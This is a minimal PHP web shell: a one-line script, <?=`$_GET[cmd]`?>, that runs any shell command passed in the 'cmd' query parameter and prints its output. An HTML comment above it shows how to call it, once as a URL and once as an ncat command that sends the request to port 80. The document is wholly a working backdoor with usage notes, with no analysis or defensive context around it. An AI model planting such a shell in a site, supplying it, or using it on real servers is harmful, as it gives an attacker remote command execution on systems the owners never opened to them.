<!--
http://host/shell.php/?cmd=ls
echo "GET /shell.php/?cmd=ls" | ncat -v host 80
//-->
<?=`$_GET[cmd]`?>
